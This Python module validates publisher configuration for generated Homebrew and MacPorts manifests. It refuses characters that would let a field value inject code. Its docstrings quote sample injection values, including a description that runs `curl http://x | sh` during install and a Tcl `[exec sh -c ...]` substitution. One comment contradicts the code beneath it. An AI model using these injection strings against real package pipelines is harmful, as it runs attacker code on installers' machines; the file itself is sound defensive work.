"""Validation for publisher configuration, kept inside the publisher package.

These helpers duplicate the shape of the checks in `continuum.config` on
purpose. The release configuration schema is being specified independently (the
normalized artifact contract), and a publisher that imported the schema it is
meant to be configured *by* would have to be rewritten the moment that schema
lands. Owning the validation here means the schema can move without touching a
package manager.

Everything here fails closed and says which key is wrong. A publisher that
accepted a half-understood configuration and then wrote a manifest would be
worse than one that refused, because the manifest is read by other people's
machines and the failure would surface there.
"""

from __future__ import annotations

import re
from typing import Any, Dict, Mapping, Optional, Tuple

from .contract import (
    CONFIGURATION_INVALID,
    CREDENTIAL_MISSING,
    MODE_TRUSTED,
    SUPPORTED_UPDATE_MODES,
    Destination,
    PublisherError,
)

# Repository secret and variable names are upper-case identifiers, for the same
# reason they are everywhere else in Continuum: the name appears in a reviewed
# configuration file, and a value that looks like an endpoint or a token is a
# credential committed to a public repository.
_NAME_RE = re.compile(r"^[A-Z][A-Z0-9_]{0,63}$")

# `owner/name`, the only shape that can be both a clone source and a
# human-readable destination.
_REPOSITORY_RE = re.compile(r"^[A-Za-z0-9._-]{1,100}/[A-Za-z0-9._-]{1,100}$")

# A branch name cannot contain whitespace, a control character, or the
# punctuation git treats as a refspec.
_BRANCH_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/-]{0,100}$")

# Homebrew token and MacPorts port name: a lower-case slug, because both
# package managers derive a class name, a binary name, or a directory from it.
_SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9._-]{0,63}$")

# Characters a generated manifest reads as syntax rather than text when the value
# lands in a bare word. `[...]` is Tcl command substitution, `$` and `{}` are Tcl
# substitution and grouping, `"` opens a quoted string that will not be closed by
# anything the emitter writes, `;` ends a statement, and `\` escapes whatever
# follows. See `require_manifest_word` and `require_manifest_string`.
_MANIFEST_WORD_FORBIDDEN = ('"', "$", ";", "[", "]", "{", "}", "\\")

# The same list, minus braces: for a field whose documented form is a brace group.
_MANIFEST_GROUP_FORBIDDEN = ('"', "$", ";", "[", "]", "\\")


def require_mapping(value: Any, where: str) -> Dict[str, Any]:
    if value is None:
        return {}
    if not isinstance(value, dict):
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be a mapping, got {type(value).__name__}"
        )
    return value


def reject_unknown(mapping: Mapping[str, Any], allowed: Tuple[str, ...], where: str) -> None:
    unknown = sorted(set(mapping) - set(allowed))
    if unknown:
        raise PublisherError(
            CONFIGURATION_INVALID,
            f"{where} has unsupported key(s): {', '.join(unknown)}; allowed: "
            f"{', '.join(allowed)}",
        )


def require_bool(value: Any, where: str, default: bool) -> bool:
    if value is None:
        return default
    if not isinstance(value, bool):
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must be true or false, got {value!r}")
    return value


def require_int(value: Any, where: str, default: int, *, minimum: int, maximum: int) -> int:
    if value is None:
        return default
    if not isinstance(value, int) or isinstance(value, bool):
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must be an integer, got {value!r}")
    if not minimum <= value <= maximum:
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be between {minimum} and {maximum}, got {value}"
        )
    return value


def require_choice(value: Any, where: str, choices: Tuple[str, ...], default: str) -> str:
    if value is None:
        return default
    if not isinstance(value, str) or value not in choices:
        raise PublisherError(
            CONFIGURATION_INVALID,
            f"{where} must be one of {', '.join(choices)}; got {value!r}",
        )
    return value


def require_text(value: Any, where: str, *, maximum: int = 200, allow_empty: bool = False) -> str:
    if value is None:
        value = ""
    if not isinstance(value, str):
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must be a string, got {value!r}")
    text = value.strip()
    if not text and not allow_empty:
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must not be empty")
    if len(text) > maximum:
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be at most {maximum} characters"
        )
    if any(char in text for char in "\n\r\0"):
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must not contain newlines")
    return text


def require_manifest_string(
    value: Any, where: str, *, maximum: int = 300, allow_empty: bool = False
) -> str:
    """A value that a generated manifest will place inside a quoted literal.

    `require_text` refuses newlines and NUL because a value that looks like two
    values is a mistake. This refuses more, for a different reason: the value does
    not end up in a data structure, it ends up as *source* in a file the package
    manager evaluates on the machine that installs the software.

    A double quote closes the literal, and everything after it is Ruby or Tcl
    rather than description. `desc "Fast"; system("curl http://x | sh"); desc ""`
    is not a malformed formula -- it is a valid one that runs a command while
    installing, and the publisher writes it happily because every field it checks
    individually is a legal string. The quoting is the boundary, so the value is
    checked against it rather than against the language of the surrounding config.

    Backslash goes with it: in both Ruby and Tcl it escapes the next character, so
    a trailing backslash swallows the closing quote the emitter wrote and turns
    one value into the start of the next line's code.
    """

    text = require_text(value, where, maximum=maximum, allow_empty=allow_empty)
    for char in ('"', "\\"):
        if char in text:
            raise PublisherError(
                CONFIGURATION_INVALID,
                f"{where} is written into a generated manifest as a quoted string and "
                f"must not contain {char!r}; the quote would end the literal and the "
                f"rest would be evaluated as manifest source. Got {value!r}",
            )
    return text


def require_manifest_word(
    value: Any,
    where: str,
    *,
    maximum: int = 300,
    allow_empty: bool = False,
    allow_braces: bool = False,
) -> str:
    """A value a generated manifest will place in a *bare* word, unquoted.

    Same reasoning as `require_manifest_string`, different consequence. A Portfile
    line is `description         A widget`, and the package manager parses the rest
    of the line as Tcl: `[exec sh -c ...]` is command substitution and `;` ends the
    statement, both of which the reader is perfectly willing to run while building.

    So the word is checked against the characters that mean something in that
    language. A value that genuinely needs one of them belongs in a template the
    project supplies, where the escaping is the author's to get right.

    `allow_braces` is for the one field whose documented MacPorts form *is* a brace
    group -- `maintainers {example.com:name User} openmaintainer`. The braces are
    syntax there, so refusing them would refuse correct configuration; what still
    has to be refused is substitution inside the group, and they still have to
    balance.
    """

    text = require_text(value, where, maximum=maximum, allow_empty=allow_empty)
    forbidden = _MANIFEST_WORD_FORBIDDEN if not allow_braces else _MANIFEST_GROUP_FORBIDDEN
    for char in forbidden:
        if char in text:
            raise PublisherError(
                CONFIGURATION_INVALID,
                f"{where} is written into a generated manifest as a bare word and must "
                f"not contain {char!r}, which the package manager reads as syntax "
                f"rather than text. Got {value!r}",
            )
    if allow_braces and text.count("{") != text.count("}"):
        raise PublisherError(
            CONFIGURATION_INVALID,
            f"{where} must balance its braces; the package manager reads an unmatched "
            f"brace as a syntax error rather than as text. Got {value!r}",
        )
    return text


def require_manifest_path(value: Any, where: str) -> str:
    """A repository-relative path that also ends up as bare manifest source.

    `require_relative_path` answers "can this escape the destination repository",
    which is a different question from "is this one token". Homebrew writes
    `bin.install widget`, so a path carrying a space or a semicolon is not a
    malformed file -- it is an argument list, and the semicolon starts a command.
    """

    path = require_relative_path(value, where)
    for char in _MANIFEST_WORD_FORBIDDEN + (" ", "\t"):
        if char in path:
            raise PublisherError(
                CONFIGURATION_INVALID,
                f"{where} is written into a generated manifest as a bare word and must "
                f"not contain {char!r}. Got {value!r}",
            )
    return path


def require_block_text(value: Any, where: str, *, maximum: int = 200_000) -> str:
    """Multi-line content — a template body, as opposed to a single-line value.

    Every other text validator here refuses a newline, because a configuration
    value that looks like two values is a mistake. A template is the one place
    where the newline *is* the content, so it gets its own validator rather than
    an exemption carved out of the others: it still refuses a non-string, a NUL,
    an over-long body, and an empty one, and it still returns the text unstripped
    because leading indentation is significant in every language a package
    manager template can be written in.
    """

    if not isinstance(value, str):
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be a string, got {type(value).__name__}"
        )
    if not value.strip():
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must not be empty")
    if "\0" in value:
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must not contain a NUL")
    if len(value) > maximum:
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be at most {maximum} characters"
        )
    return value


def require_name(value: Any, where: str) -> str:
    """A repository secret or variable name — never the value behind it."""

    if not isinstance(value, str) or not _NAME_RE.match(value):
        raise PublisherError(
            CONFIGURATION_INVALID,
            f"{where} must be an upper-case repository variable or secret name "
            f"(letters, digits, underscore); got {value!r}",
        )
    return value


def require_slug(value: Any, where: str) -> str:
    if not isinstance(value, str) or not _SLUG_RE.match(value):
        raise PublisherError(
            CONFIGURATION_INVALID,
            f"{where} must be a lower-case slug (letters, digits, '.', '_', '-'); got {value!r}",
        )
    return value


def require_repository(value: Any, where: str) -> str:
    if not isinstance(value, str) or not _REPOSITORY_RE.match(value):
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be 'owner/name'; got {value!r}"
        )
    return value


def require_relative_path(value: Any, where: str) -> str:
    """A path inside the destination repository, which cannot escape it."""

    if not isinstance(value, str) or not value.strip() or len(value) > 240:
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must be a repository-relative path"
        )
    path = value.strip()
    if any(char in path for char in "\n\r\0") or path.startswith("/") or "\\" in path:
        raise PublisherError(
            CONFIGURATION_INVALID,
            f"{where} must be a repository-relative path without a leading '/' or a "
            f"backslash; got {value!r}",
        )
    if ".." in path.split("/"):
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where} must not contain a '..' segment; got {value!r}"
        )
    return path


def require_token(value: Any, where: str) -> str:
    """An identifier a package manager turns into a class or command name.

    Camel case is accepted and normalised, because that is how the identifier is
    usually written down ("a camel-cased name") while the package manager
    requires the upper-case-first form.
    """

    slug = require_slug(value, where)
    return "".join(part.capitalize() for part in re.split(r"[-_]", slug) if part)


def require_url(value: Any, where: str) -> str:
    text = require_text(value, where, maximum=300)
    if not text.startswith("https://"):
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must be an https URL; got {value!r}")
    # A URL is usually written into a generated manifest as `homepage "..."`, so
    # it is checked against that boundary here rather than discovered as a broken
    # formula at install time. `require_manifest_string` is not applied to it
    # because the destination tree is derived from it.
    return require_manifest_string(text, where, maximum=300)


def require_mapping_of_text(value: Any, where: str) -> Dict[str, str]:
    if value is None:
        return {}
    if not isinstance(value, dict):
        raise PublisherError(CONFIGURATION_INVALID, f"{where} must be a mapping")
    return {key: require_text(item, f"{where}.{key}") for key, item in value.items()}


def credential_present(destination: Destination, environment: Mapping[str, str]) -> bool:
    """Whether the destination's own credential is actually available.

    An empty value counts as absent. A job that was handed the variable with
    nothing in it — which is what a fork receives — would otherwise be recorded
    as authorised, and the write would be attempted with no credential behind
    it, failing somewhere far from the cause.
    """

    return bool((environment.get(destination.credential_secret) or "").strip())


def require_credential(destination: Destination, environment: Mapping[str, str]) -> str:
    if not credential_present(destination, environment):
        raise PublisherError(
            CREDENTIAL_MISSING,
            f"the credential for {destination.repository!r} is not available in this "
            f"job; a cross-repository write uses its own named credential, and "
            f"{destination.credential_secret!r} is empty",
            remediation=(
                f"expose the repository secret {destination.credential_secret} to this "
                "job. A pull request from a fork never receives it, which is the "
                "correct outcome: a fork should not be able to write to a tap."
            ),
        )
    return destination.credential_secret


def parse_destination(
    value: Any,
    where: str,
    *,
    default_branch: str = "main",
    default_mode: str = MODE_TRUSTED,
    required: bool = True,
) -> Optional[Destination]:
    """Parse a destination block.

    Absent and explicitly disabled are different answers. A destination that is
    not configured at all means the publisher has nowhere to write, which for
    every surface it owns is a configuration error rather than a silent skip:
    quietly doing nothing is how a version goes un-published on a green run.

    `branch` is the base branch in both modes. In `trusted` it is the branch a
    publisher commits to directly; in `pull-request` it is the branch its pull
    request targets, and the feature branch is derived from the version so a
    re-run updates the pull request it already has.
    """

    if value is None:
        if required:
            raise PublisherError(
                CONFIGURATION_INVALID,
                f"{where} is required: a publisher with no destination would report "
                "success while publishing nothing",
            )
        return None
    mapping = require_mapping(value, where)
    reject_unknown(
        mapping, ("repository", "branch", "mode", "credential_secret", "attempts"), where
    )
    repository = require_repository(mapping.get("repository"), f"{where}.repository")
    branch = mapping.get("branch", default_branch)
    if not isinstance(branch, str) or not _BRANCH_RE.match(branch):
        raise PublisherError(
            CONFIGURATION_INVALID, f"{where}.branch must be a git branch name; got {branch!r}"
        )
    return Destination(
        repository=repository,
        branch=branch,
        mode=require_choice(
            mapping.get("mode"), f"{where}.mode", SUPPORTED_UPDATE_MODES, default_mode
        ),
        credential_secret=require_name(
            mapping.get("credential_secret"), f"{where}.credential_secret"
        ),
        attempts=require_int(
            mapping.get("attempts"), f"{where}.attempts", 2, minimum=1, maximum=5
        ),
    )


__all__ = [
    "credential_present",
    "parse_destination",
    "reject_unknown",
    "require_block_text",
    "require_bool",
    "require_choice",
    "require_int",
    "require_mapping",
    "require_mapping_of_text",
    "require_name",
    "require_relative_path",
    "require_repository",
    "require_slug",
    "require_text",
    "require_token",
    "require_url",
]
